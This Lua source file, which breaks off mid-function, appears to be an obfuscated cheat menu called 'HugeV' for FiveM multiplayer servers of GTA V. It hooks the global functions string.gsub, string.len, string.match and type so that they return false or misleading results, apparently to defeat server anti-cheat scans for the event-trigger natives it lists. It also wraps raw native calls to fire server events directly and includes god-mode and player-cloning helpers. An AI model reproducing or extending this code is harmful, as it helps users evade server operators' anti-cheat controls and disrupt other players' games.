local InvokeNativeGowno_IDYHGIUSDGSDFG = Citizen.InvokeNative

local function Invoke_Fajny_NI_IDUFUOISDJGLSDGFDF(invoke_uhdogsidudfgdf,...) -- No invoki
return InvokeNativeGowno_IDYHGIUSDGSDFG(invoke_uhdogsidudfgdf.." ",...)
end

local function IntToFloat_NUGTHBGNURTHNHTR(int_DSIGISDG)
    if int_DSIGISDG then
        local float_DSGJISDGSD = int_DSIGISDG + 0.0
        return float_DSGJISDGSD
    else
        return nil
    end
end

local Czitirzen_Invoke = Invoke_Fajny_NI_IDUFUOISDJGLSDGFDF

local cachedNotifications_DSIGHSIDGSD = {}

local function addNotification_DSIGSODGSDG(text_DSGUSIDGSDG, ms_DSGUHDSIGSDG)
    table.insert(cachedNotifications_DSIGHSIDGSD, { ['text_DSGUSIDGSDG'] = text_DSGUSIDGSDG, ['time_DSGIUSDGSDG'] = ms_DSGUHDSIGSDG, ['startTime_DSGISDOGSDG'] = Czitirzen_Invoke(0x9CD27B0045628463) })
end

local function removeNotification_DIGOHSDIGSDG(id_DSUGHISDGSDG)
    table.remove(cachedNotifications_DSIGHSIDGSD, id_DSUGHISDGSDG)
end

local che_POSDIYGISUDFDG = string.len

local old_string_match_DSGUISDG = string.match

local function string_normalen(str_HDGUFSKGDFG)
return che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))
end

local function Draw3d_SDGIUSDIOGSDG(x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS, text_DSGUSIDGSDG, opacity_DSGIHSDIGSDGDSG)
    if opacity_DSGIHSDIGSDGDSG > 255 then
        opacity_DSGIHSDIGSDGDSG = 255
    elseif opacity_DSGIHSDIGSDGDSG < 0 then
        opacity_DSGIHSDIGSDGDSG = 0
    end

	Czitirzen_Invoke(0x07C837F9A01C34C9, 0.35, 0.35)
	Czitirzen_Invoke(0x441603240D202FA6, 2, 0, 0, 0, 255)
	Czitirzen_Invoke(0x2513DFB0FB8400FE)
    Czitirzen_Invoke(0x66E0276CC5F6B9DA, 4)
    Czitirzen_Invoke(0x038C1F517D7FDCF8, 1)
    Czitirzen_Invoke(0xBE6B23FFA53FB442, 255, 255, 255, math.floor(opacity_DSGIHSDIGSDGDSG))
    Czitirzen_Invoke(0x25FBB336DF1804CB, tostring('STRING'))
    Czitirzen_Invoke(0xC02F4DBFB51D988B, 1)
    Czitirzen_Invoke(0x6C188BE134E074AA, tostring(text_DSGUSIDGSDG))
    Czitirzen_Invoke(0xCD015E5BB0D96A57, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS)
    
    local factor_DSGSDGISDGDS = string_normalen(tostring(text_DSGUSIDGSDG)) / 300
    
    Czitirzen_Invoke(0x3A618A217E5154F0, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS + 0.0135, 0.0155 + factor_DSGSDGISDGDS, 0.03, 25, 25, 25, opacity_DSGIHSDIGSDGDSG)
    Czitirzen_Invoke(0x3A618A217E5154F0, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS + 0.0125, 0.015 + factor_DSGSDGISDGDS, 0.03, 255, 0, 0, opacity_DSGIHSDIGSDGDSG)
end

local function PushNotification_DSGJHDSGHSIDUGDS(text_DSGUSIDGSDG, ms_DSGIOJSDIGSDG)
	if text_DSGUSIDGSDG then
		if not ms_DSGIOJSDIGSDG then ms_DSGIOJSDIGSDG = 7500 end
        addNotification_DSIGSODGSDG(text_DSGUSIDGSDG, ms_DSGIOJSDIGSDG)
    end
end

local Atomic_Invoke_UGDIUGFHKDFSGFD={
0x128737EA,
0x76A9EE1F,
0x509D5878EB39E842,
0xAAA34F8A7CB32098,
0xD49F9B0955C367DE,
0xAF35D0D2583051B0,
0x43A66C31C68491C0,
0x673966A0C0FD7171,
0x91310870,
0x7FDD1128,
'0x128737EA',
'0x76A9EE1F',
'0x509D5878EB39E842',
'0xAAA34F8A7CB32098',
'0xD49F9B0955C367DE',
'0xAF35D0D2583051B0',
'0x43A66C31C68491C0',
'0x673966A0C0FD7171',
'0x91310870',
'0x7FDD1128'
}

local HugeV_KEYSHTRHRTHTRH = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["RMOUSE"] = 114,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["LEFT"] = 174,
    ["right_DSIGHIDSUGSD"] = 175,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["MWHEELUP"] = 15,
    ["MWHEELDOWN"] = 14,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N8"] = 61,
    ["N9"] = 118,
    ["MOUSE1"] = 24,
    ["MOUSE2"] = 25,
    ["MOUSE3"] = 348
}

local old_string_gsub_DSIGHSIUDG = string.gsub

local function normal_string_gsub_SDGHSDIGSD(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
return old_string_gsub_DSIGHSIUDG(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
end

string.gsub = function(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
	if find_DSGJIDSGDS == " " or find_DSGJIDSGDS == "%s+" then
		return string_SDGIJSDG
	elseif replace_DSGHSDIUGDS == "" then
		return string_SDGIJSDG
	else
		old_string_gsub_DSIGHSIUDG(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
	end
end

string.len = function(str_HDGUFSKGDFG) -- Blokowanie string.len
	if not(che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))>=8 and che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))<=20) then
		local str_HDGUFSKGDFG = che_POSDIYGISUDFDG(str_HDGUFSKGDFG) - 1
		return str_HDGUFSKGDFG
	else
		return che_POSDIYGISUDFDG(str_HDGUFSKGDFG)
	end
end

string.match = function(string_udhgiusdgfd, find_duhugsidgdfg)
	for i_didsfyg98sduriesdfg = 0, #Atomic_Invoke_UGDIUGFHKDFSGFD do
	if string_udhgiusdgfd == Atomic_Invoke_UGDIUGFHKDFSGFD[i_didsfyg98sduriesdfg] or find_duhugsidgdfg == Atomic_Invoke_UGDIUGFHKDFSGFD[i_didsfyg98sduriesdfg] then
		return false
	elseif string.lower(string_udhgiusdgfd) == Atomic_Invoke_UGDIUGFHKDFSGFD[i_didsfyg98sduriesdfg] or string.lower(find_duhugsidgdfg) == Atomic_Invoke_UGDIUGFHKDFSGFD[i_didsfyg98sduriesdfg] then
		return false
	elseif find_duhugsidgdfg == ""then
		return false
	elseif string_udhgiusdgfd == nil or find_duhugsidgdfg == nil then
		return false
	else
		return true
	end
end
end

local old_type_DSUGHISDGSD = type
type = function(string_DSUGHIDSUG)
	if old_type_DSUGHISDGSD(string_DSUGHIDSUG) == "string"then
		return 
	else
		return old_type_DSUGHISDGSD(string_DSUGHIDSUG)
	end
end

local fov_x_DISFISDUSGFDG = 0.40
local fov_x2_DISFISDUSGFDG = 0.60
local fov_y_DISFISDUSGFDG = 0.40
local fov_y2_DISFISDUSGFDG = 0.60
local current_fov_SUHFIUSDFSDF = 1
local heading_ADIGSDGSD = 0
local crouched_DSIHGIUSDGSD = false

local God_Mode_Mala_Kurwo_sufgdsioufsldsdf = false


local function notyfikacja_dihgiuosergser(text_dughisergdfdg)
    Czitirzen_Invoke(0x202709F4C58A0424, "STRING")
    Czitirzen_Invoke(0x94CF4AC034C9C986, text_dughisergdfdg)
    Czitirzen_Invoke(0x2ED7843F8F801023, false, false)
end

-- Custom

local function Czlowiek_Wait_IDYGOSIFJGDFG(ms_SJFDSIUFSD)
	coroutine.yield(Czitirzen_Invoke(0x9CD27B0045628463) + ms_SJFDSIUFSD)
end

local CreateThreadOczywiscie_DIASYUG8OADIUFGDSFG = Citizen.CreateThreadNow
local function CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(...) -- CreateThreadNow
return CreateThreadOczywiscie_DIASYUG8OADIUFGDSFG(...)
end

-- Takie funckje z invokami

local function GetResourceName_HugeV_dihgsidlgudfsgd(...)
return Czitirzen_Invoke(0xe5e9ebbb, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetServerIP_HugeV_udgshgksudigksdf(...)
return Czitirzen_Invoke(0xea11bfba, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetServerIPWithoutPort_HugeV_UDGYUSDGFDGF(...)
            local ip_UDYUDSGYKFDG = GetServerIP_HugeV_udgshgksudigksdf()
            if ip_UDYUDSGYKFDG == nil then
            return 'nieznaleziono ip'
            else
            return string.sub(ip_UDYUDSGYKFDG, 0, string.find(ip_UDYUDSGYKFDG, ":") - 1)
            end
        end
		
local function GetServerPort_HugeV_UDGUYSDFGKFD(...)
local s_ufdhsgudigsdfg = GetServerIP_HugeV_udgshgksudigksdf()
local xd_duhsfigdsf, xd2_duhsuydhgksdfg = string.find(s_ufdhsgudigsdfg, ":")
local to_return_DSUGHIDSG = string.sub(s_ufdhsgudigsdfg, xd_duhsfigdsf + 1)
return to_return_DSUGHIDSG
end

local function GetYouId_HugeV_idasygiosuglsdf(...)
return Czitirzen_Invoke(0x4d97bcc7, Czitirzen_Invoke(0x4F8644AF03D0E0D6), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerId_HugeV_OIDHUFIDSUGLFD(...)
return Czitirzen_Invoke(0x4d97bcc7, ..., Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetNumVehicleMods_HugeV_UDYUFGSDHGUJFDGY(vehicle_DSGHIUSDGDS, modType_DSUGHSDIUGSD)
return Czitirzen_Invoke(0xE38E9162A2500646, vehicle_DSGHIUSDGDS, modType_DSUGHSDIUGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerServerId_HugeV_DUHGIUSHGUFD(player_usdfugsdfig)
return Czitirzen_Invoke(0x4d97bcc7, player_usdfugsdfig, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerName_HugeV_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg)
return Czitirzen_Invoke(0x6D0DE6A7B5DA71F8, player_ifhgsdiugdsfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetOnscreenKeyboardResult_HugeV_UDHUYGFDSIGDF() -- GetOnscreenKeyboardResult
return Czitirzen_Invoke(0x8362B09B91893647, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetResourceState_HugeV_DIHUIGFIDUGDFG(resourceName_UYDUHGIFDGF)
return Czitirzen_Invoke(0x4039b485, tostring(resourceName_UYDUHGIFDGF), Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetEntityCoords_HugeV_UDHGIUDIKGDFG(entity_idfshgosdfg, alive_duhsdiufgsdf)
return Czitirzen_Invoke(0x3FEF770D40960D5A, entity_idfshgosdfg, alive_duhsdiufgsdf, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetEntityHeading_HugeV_UDYUGDHIGKDFG(entity_idfshgosdfg)
return Czitirzen_Invoke(0xE83D4F9BA2A38914, entity_idfshgosdfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetEntityRotation_HugeV_DSGUHSDUYGUSD(entity_DSIGHSIDUG, rotationOrder_DSUGSIDGSD)
return Czitirzen_Invoke(0xAFBD61CC738D9EB9, entity_DSIGHSIDUG, rotationOrder_DSUGSIDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetGameplayCamRot_HugeV_DSUGHSDUIGSD(rotationOrder_DSUGSIDGSD)
return Czitirzen_Invoke(0x837765A25378F0BB, rotationOrder_DSUGSIDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetEntityForwardVector_HugeV_SDGHSDIUGSD(entity_DSIGHSIDUG)
return Czitirzen_Invoke(0x0A794A5A57F8DF91, entity_DSIGHSIDUG, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetActivePlayers_HugeV_UDGYUDFIGKDFGDF(...)
return msgpack.unpack(Czitirzen_Invoke(0xcf143fb9, Citizen.ReturnResultAnyway(), Citizen.ResultAsObject()))
end

local function GetPedInVehicleSeat_HugeV_USDGFUYDSFSD(vehicle_USYUFGDSGFDG, index_DUGFUISDHYKGFS)
return Czitirzen_Invoke(0xBB40DD2270B65366, vehicle_USYUFGDSGFDG, index_DUGFUISDHYKGFS, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(ped_diughiusdgsdf, lastvehicle_dusfhdifgsdfg)
if lastvehicle_dusfhdifgsdfg == nil then
return Czitirzen_Invoke(0x9A9112A0FE9A4713, ped_diughiusdgsdf, false, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
else
return Czitirzen_Invoke(0x9A9112A0FE9A4713, ped_diughiusdgsdf, lastvehicle_dusfhdifgsdfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end
end

local function IsVehicleSeatFree_HugeV_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, seatIndex_d8ygusdfgsdfg)
return Czitirzen_Invoke(0x22AC59A870E6A669, vehicle_UDHUHDFSGDFG, seatIndex_d8ygusdfgsdfg, Citizen.ReturnResultAnyway())
end

local function GetCurrentPedWeapon_HugeV_UDIUGHUSGFD(ped_duhgsiudgsdfg, p2_idhgsiugdfsg)
return Czitirzen_Invoke(0x3A87E44BB9A01D54, ped_duhgsiudgsdfg, Citizen.PointerValueInt(), p2_idhgsiugdfsg, Citizen.ReturnResultAnyway())
end

local function GetPedBoneCoords_HugeV_GDUYFSDGF(ped_UDGUFYFDG, boneId_DIUSDHIGUSDFG, offsetX_IDUHFUYSDHFDSF, offsetY_IDUHFUYSDHFDSF, offsetZ_IDUHFUYSDHFDSF)
return Czitirzen_Invoke(0x17C07FC640E86B4E, ped_UDGUFYFDG, boneId_DIUSDHIGUSDFG, offsetX_IDUHFUYSDHFDSF, offsetY_IDUHFUYSDHFDSF, offsetZ_IDUHFUYSDHFDSF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetPedBoneIndex_HugeV_DSGIHSDGSDG(ped_DSGHSIUDGSD, boneId_DSGUHISDGSD)
return Czitirzen_Invoke(0x3F428D08BE5AAE31, ped_DSGHSIUDGSD, boneId_DSGUHISDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetEntityBoneIndexByName_HugeV_SDUGHSDIUGSDG(entity_DSIGHSIDUG, boneName_DSUGHISDGSD)
return Czitirzen_Invoke(0xFB71170B7E76ACBA, entity_DSIGHSIDUG, tostring(boneName_DSUGHISDGSD), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function World3dToScreen2d_Hugev_UDHUGIDFGDF(worldX_YDGUYDFIGDFGDF, worldY_YDGUYDFIGDFGDF, worldZ_YDGUYDFIGDFGDF)
	return Czitirzen_Invoke(0x34E82F05DF2974F5, worldX_YDGUYDFIGDFGDF, worldY_YDGUYDFIGDFGDF, worldZ_YDGUYDFIGDFGDF, Citizen.PointerValueFloat(), Citizen.PointerValueFloat(), Citizen.ReturnResultAnyway())
end

function GetWeaponDamage_HugeV_SDGHSDUGDS(weaponHash_DSHUGYUSDGDS, componentHash_DGHSIUGDS)
return Czitirzen_Invoke(0x3133B907D8B32053, weaponHash_DSHUGYUSDGDS, componentHash_DGHSIUGDS, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetDistanceBetweenCoords_HugeV_UDHGIUSDHGIUDF(x1_DSHGIUFDGHUIDFGDF, y1_DSHGIUFDGHUIDFGDF, z1_DSHGIUFDGHUIDFGDF, x2_DSHGIUFDGHUIDFGDF, y2_DSHGIUFDGHUIDFGDF, z2_DSHGIUFDGHUIDFGDF, useZ_DIUHGUSHGIUDFGDF)
	return Czitirzen_Invoke(0xF1B760881820C952, x1_DSHGIUFDGHUIDFGDF, y1_DSHGIUFDGHUIDFGDF, z1_DSHGIUFDGHUIDFGDF, x2_DSHGIUFDGHUIDFGDF, y2_DSHGIUFDGHUIDFGDF, z2_DSHGIUFDGHUIDFGDF, useZ_DIUHGUSHGIUDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetOffsetFromEntityInWorldCoords_HugeV_UHDIUGHDFUGHDFG(entity_DUHGIUDSFHGIUDFGDF, offsetX_DSUGHIUFHGIUDFGDF, offsetY_DSUGHIUFHGIUDFGDF, offsetZ_DSUGHIUFHGIUDFGDF)
	return Czitirzen_Invoke(0x1899F328B0E12848, entity_DUHGIUDSFHGIUDFGDF, offsetX_DSUGHIUFHGIUDFGDF, offsetY_DSUGHIUFHGIUDFGDF, offsetZ_DSUGHIUFHGIUDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetResourceByFindIndex_HugeV_DSUGHIUDSHIUFDGDF(findIndex_DSUIHGIUSDHGIDFGDF)
	return Czitirzen_Invoke(0x387246b7, findIndex_DSUIHGIUSDHGIDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetNumResources_HugeV_DUSGUFFHIDGIDFG()
	return Czitirzen_Invoke(0x863f27b, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetGroundZFor_3dCoord_HugeV_DGUISDHIGHIFD(x_DUYGFIUDSGFSD, y_DUYGFIUDSGFSD, z_DUYGFIUDSGFSD, unk_DUYGFIUDSGFSD)
return Czitirzen_Invoke(0xC906A7DAB05C8D2B, x_DUYGFIUDSGFSD, y_DUYGFIUDSGFSD, z_DUYGFIUDSGFSD, Citizen.PointerValueFloat(), unk_DUYGFIUDSGFSD, Citizen.ReturnResultAnyway())
end

local function GetFirstBlipInfoId_HugeV_DISGHIUDSHIGFD(blipSprite_IDSHGIUHIUSDGFD)
return Czitirzen_Invoke(0x1BEDE233E6CD2A1F, blipSprite_IDSHGIUHIUSDGFD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetSelectedPedWeapon_HugeV_DSUGHISDUGSD(ped_DUHGISUGDSGDS)
return Czitirzen_Invoke(0x0A6DB4965674D243, ped_DUHGISUGDSGDS, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function AddCustomization_HugeV_DSIUHGIUDSGSD(HASH_IDSUGIDSHISDGSD)
return Czitirzen_Invoke(0xD966D51AA5B28BB9, Czitirzen_Invoke(0xD80958FC74E988A6), GetSelectedPedWeapon_HugeV_DSUGHISDUGSD(Czitirzen_Invoke(0xD80958FC74E988A6)), HASH_IDSUGIDSHISDGSD)
end

local function RemoveCustomization_HugeV_DSIUHGIUDSGSD(HASH_IDSUGIDSHISDGSD)
return Czitirzen_Invoke(0x1E8BE90C74FB4C09, Czitirzen_Invoke(0xD80958FC74E988A6), GetSelectedPedWeapon_HugeV_DSUGHISDUGSD(Czitirzen_Invoke(0xD80958FC74E988A6)), HASH_IDSUGIDSHISDGSD)
end

local function CreateDui_HugeV_DSGUHSDUIGSDGSD(url_DSUGISDIGSDG, width_DSGUSDIGSDG, height_SDGUSDIGUSDG)
return Czitirzen_Invoke(0x23eaf899, tostring(url_DSUGISDIGSDG), width_DSGUSDIGSDG, height_SDGUSDIGUSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function CreateRuntimeTxd_HugeV_DSGHDSUIGSDGDS(name_idgjiserjios)
return Czitirzen_Invoke(0x1f3ac778, tostring(name_idgjiserjios), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function GetDuiHandle_HugeV_DSGUSHDIGUSDG(duiObject_DSUHSIDGHUSDG)
return Czitirzen_Invoke(0x1655d41d, duiObject_DSUHSIDGHUSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function CreateRuntimeTextureFromDuiHandle_HugeV_SDUGHSIDHGSD(txd_DSGIUHISDUGSD, txn_DSGIUHISDUGSD, duiHandle_DSGIUHISDUGSD)
return Czitirzen_Invoke(0xb135472b, txd_DSGIUHISDUGSD, tostring(txn_DSGIUHISDUGSD), tostring(duiHandle_DSGIUHISDUGSD), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function GetEntityHealth_HugeV_DSUGHISDUGSDG(entity_DSIGHSIDUG)
return Czitirzen_Invoke(0xEEF059FAD016D209, entity_DSIGHSIDUG, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetBlipSprite_HugeV_DSIGHSDIUGSD(blip_DSGHSIDUGSD)
return Czitirzen_Invoke(0x1FC877464A04FC4F, blip_DSGHSIDUGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetVehicleNumberOfPassengers_HugeV_DSGUHSDIGSDGDS(vehicle_DSUGIHSDGSDG)
return Czitirzen_Invoke(0x24CB2137731FFE89, vehicle_DSUGIHSDGSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function IsDisabledControlPressed_HugeV_DSUHGSUDGD(inputGroup_HUDSUIGDS, control_DSJGHISDGSD)
return Czitirzen_Invoke(0xE2587F8CBBD87B1D, inputGroup_HUDSUIGDS, control_DSJGHISDGSD, Citizen.ReturnResultAnyway())
end

local function GetDisabledControlNormal_HugeV_DSGIHSIDUGSDG(inputGroup_HUDSUIGDS, control_DSJGHISDGSD)
return Czitirzen_Invoke(0x11E65974A982637C, inputGroup_HUDSUIGDS, control_DSJGHISDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetShapeTestResult_HugeV_DSUGHIDSUGS(rayHandle_DSUGHISDGSD)
return Czitirzen_Invoke(0x3D87450E15D98694, rayHandle_DSUGHISDGSD, Citizen.PointerValueInt(), Citizen.PointerValueVector(), Citizen.PointerValueVector(), Citizen.PointerValueInt(), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetTextureResolution_HugeV_SDIGSIDJGIDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS)
return Czitirzen_Invoke(0x35736EE65BD00C11, tostring(textureDict_SDGHSIUDGSDG), tostring(textureName_DSGUHSDUGHIUDS), Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetAspectRatio_HugeV_DSHUGHSIDG(bool_DSGHSDIUGSDG)
return Czitirzen_Invoke(0xF1307EF624A80D87, bool_DSGHSDIUGSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetRandomPlayer_HugeV_DSGUHSDIUGDS()
local to_return_DSUGHIDSG = math.random(0, #GetActivePlayers_HugeV_UDGYUDFIGKDFGDF())
if GetPlayerServerId_HugeV_DUHGIUSHGUFD(to_return_DSUGHIDSG) ~= 0 then
return to_return_DSUGHIDSG
else
return false
end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------

local texture_preload_DSGHDSIUGDSG = {
	"commonmenu",
	"mpleaderboard",
	"mphud",
	"helicopterhud",
}

local function PreloadTextures_DSIGJSIUDGSDG()
	
	for i = 1, #texture_preload_DSGHDSIUGDSG do
		Czitirzen_Invoke(0xDFA2EF8E04127DD5, texture_preload_DSGHDSIUGDSG[i])
	end

end

PreloadTextures_DSIGJSIUDGSDG()

local function LoadDui_DSIGUISDGSDG(link)
if GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG ~= nil then
Czitirzen_Invoke(0xa085cb10, GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG)
end
local GUI_GIF_DSGUIDSHGOSDGSD = true
local GUI_GIF_DSGSDIUGSDGSD = CreateRuntimeTxd_HugeV_DSGHDSUIGSDGDS("hugev_gif_DSGUHSDGISDG")
local GUI_GIF_DSGFSDUHFEIOSGWGSDG = nil
if GUI_GIF_DSGUIDSHGOSDGSD then
    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(
        function()
            GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG = CreateDui_HugeV_DSGUHSDUIGSDGSD(tostring(link), 1900, 512)
            Czlowiek_Wait_IDYGOSIFJGDFG(125)
            local GUI_GIF_AUYSFGSAYFSDF = GetDuiHandle_HugeV_DSGUSHDIGUSDG(GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG)
            local GUI_GIF_DISUYTFDSYFSDG = CreateRuntimeTextureFromDuiHandle_HugeV_SDUGHSIDHGSD(GUI_GIF_DSGSDIUGSDGSD, "duiTex_DSIOGJSDG", GUI_GIF_AUYSFGSAYFSDF)
            Czlowiek_Wait_IDYGOSIFJGDFG(125)
            Czitirzen_Invoke(0xa66f8f75, "shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "hugev_gif_DSGUHSDGISDG", "duiTex_DSIOGJSDG")
            GUI_GIF_DSGUIDSHGOSDGSD = false
        end
    )
end

end

local DSUHGSIUD_theme_green = true
local DSUHGSIUD_theme_purple = false
local DSUHGSIUD_theme_red = false
local DSUHGSIUD_theme_blue = false

local function LoadGif_DSGHDSIUGSDG()
if DSUHGSIUD_theme_purple then
LoadDui_DSIGUISDGSDG("https://media.discordapp.net/attachments/730443281720279140/771006610092982272/ezgif-3-b91c1cbf3c87.gif")
elseif DSUHGSIUD_theme_green then
LoadDui_DSIGUISDGSDG("https://media.discordapp.net/attachments/730443281720279140/771006597451218999/ble.gif")
end

end

LoadGif_DSGHDSIUGSDG()

-- Funkcje

local function RGB_Rainbow_DSUGSIDGSD(frequency_DDUSHGIDS)
    local result_DSUGIISDG = {}
    local curtime_DSUIHGISDG = Czitirzen_Invoke(0x9CD27B0045628463) / 1000

    result_DSUGIISDG.r = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 0) * 127 + 128)
    result_DSUGIISDG.g = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 2) * 127 + 128)
    result_DSUGIISDG.b = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 4) * 127 + 128)

    return result_DSUGIISDG
end

local function Trigger_HugeV_Private_Event_digyuseogr9sdfg(server_DJHGSGSDUGSD, event_DSIHGIUSDGSD, ...)
	local payload_DSUFHISDUGSDG = msgpack.pack({...})
	if server_DJHGSGSDUGSD then
		Czitirzen_Invoke(0x7fdd1128, event_DSIHGIUSDGSD, payload_DSUFHISDUGSDG)
	else
		Czitirzen_Invoke(0x91310870, event_DSIHGIUSDGSD, payload_DSUFHISDUGSDG)
	end
end


local function math_round_DSIHGIUDFJGIDF(num_DSUGHIDUFGDFGDF, numDecimalPlace_DSGHIUSDHGIUDFGDF)
    return tonumber(string.format("%.".. (numDecimalPlace_DSGHIUSDHGIUDFGDF or 0) .. "f", num_DSUGHIDUFGDFGDF))
end

	local function ClonePed_HugeV_UDYUIGDFGDF(Target_grejtjtrkyt)
		local ped_htrjkykutkiy = Czitirzen_Invoke(0x43A66C31C68491C0, Target_grejtjtrkyt)
		local me_hrejtrGFgre = Czitirzen_Invoke(0xD80958FC74E988A6)
		
		hat_trjtyrjkytkt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 0)
		hat_texture_hgrehjrtjt = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 0)
		
		glasses_htrkytrkyt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 1)
		glasses_texture_RJRTJRRTJ = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 1)
		
		eare_grehrehgregrrt = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 2)
		ear_texture_HREHRTHJTRJR = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 2)
		
		watch_hETRTRT = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 6)
		watch_texture_HRTEJRYJYTJTY = Czitirzen_Invoke(0xE131A28626F81AB2, ped_htrjkykutkiy, 6)
		
		wrist_EHTRHRHJRJY = Czitirzen_Invoke(0x898CC20EA75BACD8, ped_htrjkykutkiy, 7)
